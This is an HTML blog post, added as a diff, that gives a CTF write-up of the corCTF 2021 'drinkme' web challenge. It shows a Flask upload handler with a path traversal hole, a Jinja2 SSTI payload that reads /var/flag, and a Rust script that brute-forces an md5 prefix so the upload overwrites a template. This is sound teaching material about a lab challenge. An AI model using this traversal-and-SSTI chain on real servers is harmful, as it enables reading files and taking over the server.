@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>drinkme</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/corctf-2021/drinkme/#app-py">app.py</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>drinkme</h1>
+    </header>
+
+    <div class="content">
+        <pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Are you thirsty? Why don&#39;t you try some of our drinks at our new store, drinkme! Leave a message on the wall too when you&#39;re done.
+</span><span>NOTE: Flag is at /var/flag
+</span><span>NOTE: This challenge uses per-team instances. Please test locally and don&#39;t launch one until you have a working exploit.
+</span><span>NOTE: The drinkme instancer takes a bit of time (&lt; 1 min) to start the container, please be patient.
+</span><span>https://drinkme.be.ax
+</span></code></pre>
+<p>We get all source again and I'm just including the server file for brevity.</p>
+<h1 id="app-py">app.py</h1>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span style="color:#ffa759;">from </span><span>flask </span><span style="color:#ffa759;">import </span><span>Flask</span><span style="color:#ccc9c2cc;">, </span><span>flash</span><span style="color:#ccc9c2cc;">, </span><span>request</span><span style="color:#ccc9c2cc;">, </span><span>redirect</span><span style="color:#ccc9c2cc;">, </span><span>url_for</span><span style="color:#ccc9c2cc;">, </span><span>render_template</span><span style="color:#ccc9c2cc;">, </span><span>send_from_directory
+</span><span style="color:#ffa759;">import </span><span>os
+</span><span style="color:#ffa759;">import </span><span>hashlib
+</span><span>app </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Flask</span><span>(__name__)
+</span><span>app</span><span style="color:#f29e74;">.</span><span>secret_key </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;537472656c6c6963206973206d79206661766f72697465206d656d626572206f6620436f52&#39; </span><span style="font-style:italic;color:#5c6773;"># Don&#39;t bother trying to exploit - this is just to get flash() to work because I&#39;m too lazy to make proper error messages
+</span><span style="font-style:italic;color:#5c6773;"># stuff for per-team instances, can probably ignore this line
+</span><span style="color:#ffa759;">if </span><span>os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getenv</span><span>(</span><span style="color:#bae67e;">&#39;PORT&#39;</span><span>) </span><span style="color:#f29e74;">is not </span><span style="color:#ffcc66;">None</span><span>:
+</span><span>    app</span><span style="color:#f29e74;">.</span><span>config[</span><span style="color:#bae67e;">&#39;SERVER_NAME&#39;</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getenv</span><span>(</span><span style="color:#bae67e;">&#39;PORT&#39;</span><span>)}</span><span style="color:#bae67e;">.drinkme.be.ax&quot;
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/&#39;</span><span>)
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/index&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">index</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;index.html&#39;</span><span>)
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/upload&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">methods</span><span style="color:#f29e74;">=</span><span>[</span><span style="color:#bae67e;">&#39;POST&#39;</span><span>])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">upload</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#bae67e;">&#39;file&#39; </span><span style="color:#f29e74;">not in </span><span>request</span><span style="color:#f29e74;">.</span><span>files:
+</span><span>        </span><span style="color:#ffd580;">flash</span><span>(</span><span style="color:#bae67e;">&#39;You, uh, kinda need a file.&#39;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span>))
+</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#bae67e;">&#39;type&#39; </span><span style="color:#f29e74;">not in </span><span>request</span><span style="color:#f29e74;">.</span><span>form:
+</span><span>        </span><span style="color:#ffd580;">flash</span><span>(</span><span style="color:#bae67e;">&#39;Please specify a filetype.&#39;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span>))
+</span><span>    file </span><span style="color:#f29e74;">= </span><span>request</span><span style="color:#f29e74;">.</span><span>files[</span><span style="color:#bae67e;">&#39;file&#39;</span><span>]
+</span><span>    UPLOAD_FOLDER </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;./wall/&#39; </span><span style="color:#f29e74;">+ </span><span>request</span><span style="color:#f29e74;">.</span><span>form[</span><span style="color:#bae67e;">&#39;type&#39;</span><span>]
+</span><span>    </span><span style="color:#ffa759;">if </span><span>file</span><span style="color:#f29e74;">.</span><span>filename </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;&#39;</span><span>:
+</span><span>        </span><span style="color:#ffd580;">flash</span><span>(</span><span style="color:#bae67e;">&#39;You uh, kinda need a file.&#39;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span>))
+</span><span>    </span><span style="color:#ffa759;">if </span><span>file:
+</span><span>        filename </span><span style="color:#f29e74;">= </span><span>hashlib</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">md5</span><span>(file</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">hexdigest</span><span>()[</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">5</span><span>] </span><span style="color:#f29e74;">+ </span><span style="color:#bae67e;">&#39;.&#39; </span><span style="color:#f29e74;">+ </span><span style="color:#bae67e;">&#39;.&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(file</span><span style="color:#f29e74;">.</span><span>filename</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&#39;.&#39;</span><span>)[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:</span><span>])
+</span><span>        file</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">seek</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
+</span><span>        </span><span style="color:#ffa759;">try</span><span>:
+</span><span>            file</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">save</span><span>(os</span><span style="color:#f29e74;">.</span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(UPLOAD_FOLDER</span><span style="color:#ccc9c2cc;">, </span><span>filename))
+</span><span>            </span><span style="color:#ffd580;">flash</span><span>(</span><span style="color:#bae67e;">&#39;File successfully uploaded!&#39;</span><span>)
+</span><span>            </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span>))
+</span><span>        </span><span style="color:#ffa759;">except</span><span>:
+</span><span>            </span><span style="color:#ffd580;">flash</span><span>(</span><span style="color:#bae67e;">&#39;Error while uploading file.&#39;</span><span>)
+</span><span>            </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span>))
+</span><span>    
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/wall&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">wall</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;guest_wall.html&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">images</span><span style="color:#f29e74;">=</span><span>os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">listdir</span><span>(</span><span style="color:#bae67e;">&quot;wall/image&quot;</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">text</span><span style="color:#f29e74;">=</span><span>os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">listdir</span><span>(</span><span style="color:#bae67e;">&quot;wall/text&quot;</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">videos</span><span style="color:#f29e74;">=</span><span>os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">listdir</span><span>(</span><span style="color:#bae67e;">&quot;wall/video&quot;</span><span>)) </span><span style="font-style:italic;color:#5c6773;"># Is this bad coding? Yes. Do I care? No.
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/wall/&lt;path:path&gt;&#39;</span><span>) </span><span style="font-style:italic;color:#5c6773;"># I don&#39;t even use flask so this is probably implemented completely wrong pls dont flame me
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">return_file</span><span>(</span><span style="color:#ffcc66;">path</span><span>):
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">send_from_directory</span><span>(</span><span style="color:#bae67e;">&quot;wall&quot;</span><span style="color:#ccc9c2cc;">, </span><span>path)
+</span><span>    
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/americano&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">beef</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;americano.html&#39;</span><span>)
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/cappuccino&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">pork</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;cappuccino.html&#39;</span><span>)
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/decaf&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">mutton</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;decaf.html&#39;</span><span>)
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;__main__&#39;</span><span>:
+</span><span>    app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">run</span><span>(</span><span style="color:#ffcc66;">host </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;0.0.0.0&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">port </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">5000</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">debug</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)
+</span></code></pre>
+<p>So the first thing I noticed was that it was concatenating unchecked input for the upload path and that's gross. By forging a type to include .., we can make it upload our file anywhere we want. I immediately went to "overwrite server files" and was disappointed because we don't control the filename; It's derived from the first five characters of the file md5 hash + "." + file extension. I was looking at the templates: americano.html, cappuccino.html, and <em>decaf.html</em> when it clicked. "decaf" is valid hexadecimal characters which means if we upload an html file that hashes to "decaf*" it will upload decaf.html. I did the only reasonable thing -- make an SSTI payload to read /var/flag and then brute forced for padding which hashed to that.</p>
+<pre data-lang="rust" style="background-color:#212733;color:#ccc9c2;" class="language-rust "><code class="language-rust" data-lang="rust"><span style="color:#ffa759;">use </span><span>rand</span><span style="color:#f29e74;">::</span><span>{thread_rng</span><span style="color:#ccc9c2cc;">,</span><span> Rng}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>rand</span><span style="color:#f29e74;">::</span><span>distributions</span><span style="color:#f29e74;">::</span><span>Alphanumeric</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">fn </span><span style="color:#ffd580;">main</span><span>() {
+</span><span>    </span><span style="color:#ffa759;">let</span><span> base </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;{{  self._TemplateReference__context.cycler.__init__.__globals__.__builtins__.open(&#39;/var/flag&#39;,&#39;r&#39;).read() }}&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let </span><span>(found</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">_</span><span>) </span><span style="color:#f29e74;">= </span><span>std</span><span style="color:#f29e74;">::</span><span>iter</span><span style="color:#f29e74;">::</span><span>repeat(())</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">map</span><span>(|_| {
+</span><span>        </span><span style="color:#ffa759;">let mut</span><span> attempt </span><span style="color:#f29e74;">=</span><span> base</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">to_string</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">for</span><span> i </span><span style="color:#f29e74;">in </span><span style="color:#f28779;">thread_rng</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">sample_iter</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>Alphanumeric)
+</span><span>            </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">take</span><span>(</span><span style="color:#ffcc66;">100</span><span>) {
+</span><span>            attempt</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">push</span><span>(i </span><span style="color:#f29e74;">as </span><span style="color:#ffa759;">char</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        </span><span style="color:#ffa759;">let</span><span> digest </span><span style="color:#f29e74;">= </span><span>md5</span><span style="color:#f29e74;">::</span><span>compute(</span><span style="color:#f29e74;">&amp;</span><span>attempt)</span><span style="color:#ccc9c2cc;">;
+</span><span>        (attempt</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">format!</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">{:x}</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span> digest)[</span><span style="color:#f29e74;">..</span><span style="color:#ffcc66;">5</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">to_string</span><span>())
+</span><span>    })</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">find</span><span>(|(_</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">x</span><span>)| x </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;decaf&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">println!</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span> found)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>I didn't save the flag so I'll grab it from some other writeup and update this later.</p>
+
+    </div>
+
+    
+    <div class="article-info">
+        
+        <div class="article-date">22 August 2021</div>
+        
+        <div class="article-taxonomies">
+            
+            
+                <ul class="article-tags">
+                    
+                    <li><a href="https://tsheinen.github.io/tags/web/">#web</a></li>
+                    
+                </ul>
+            
+        </div>
+    </div>
+
+</article>
+
+<script>
+window.onscroll = function() {
+    if (window.innerHeight + window.pageYOffset >= document.body.offsetHeight) {
+        var count = 200;
+        var defaults = {
+          origin: { y: 0.7 }
+        };
+
+        function fire(particleRatio, opts) {
+          confetti(Object.assign({}, defaults, opts, {
+            particleCount: Math.floor(count * particleRatio)
+          }));
+        }
+
+        fire(0.25, {
+          spread: 26,
+          startVelocity: 55,
+        });
+        fire(0.2, {
+          spread: 60,
+        });
+        fire(0.35, {
+          spread: 100,
+          decay: 0.91,
+          scalar: 0.8
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 25,
+          decay: 0.92,
+          scalar: 1.2
+        });
+        fire(0.1, {
+          spread: 120,
+          startVelocity: 45,
+        });
+    }
+}
+</script>
+<script type="text/javascript" src="/js/navbar.js"></script>
+
+
+        </main>
+        <footer>
+            
+            
+        </footer>
+    </div>
+
+
+
+    <details data-popover="up" style="right: 20px;top: 20px;">
+      <summary>
+		  <svg class="paint-roller" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="paint-roller" class="svg-inline--fa fa-paint-roller fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M416 128V32c0-17.67-14.33-32-32-32H32C14.33 0 0 14.33 0 32v96c0 17.67 14.33 32 32 32h352c17.67 0 32-14.33 32-32zm32-64v128c0 17.67-14.33 32-32 32H256c-35.35 0-64 28.65-64 64v32c-17.67 0-32 14.33-32 32v128c0 17.67 14.33 32 32 32h64c17.67 0 32-14.33 32-32V352c0-17.67-14.33-32-32-32v-32h160c53.02 0 96-42.98 96-96v-64c0-35.35-28.65-64-64-64z"/></svg>
+      </summary>
+      <div class="swatch-container">
+          
+            <div class="swatch-child" onclick="setTheme('Dark')">
+                <div style="text-align: center;">
+                  <div data-theme=Dark class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Dark </span>
+              </div>
+            </div>
+          
+            <div class="swatch-child" onclick="setTheme('Light')">
+                <div style="text-align: center;">
+                  <div data-theme=Light class="swatch">
+                    <div style="height: 100%; width:25%; background-color: var(--background-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--foreground-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color, #000000)"></div>
+                    <div style="height: 100%; width:25%; background-color: var(--highlight-color-alt, #000000)"></div>
+                  </div>
+                  <span style="color:  var(--background-color, #000000)"> Light </span>
+              </div>
+            </div>
+          
+      </div>
+    </details>
+
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "1e533cda4e344b0bb7c6bf7aef70a519"}'></script>
+    <!-- End Cloudflare Web Analytics -->
+
+    <script type="text/javascript" src="https://tsheinen.github.io/elasticlunr.min.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/search_index.en.js"></script>
+    <script type="text/javascript" src="https://tsheinen.github.io/js/search.js"></script>
+</body>
+</html>
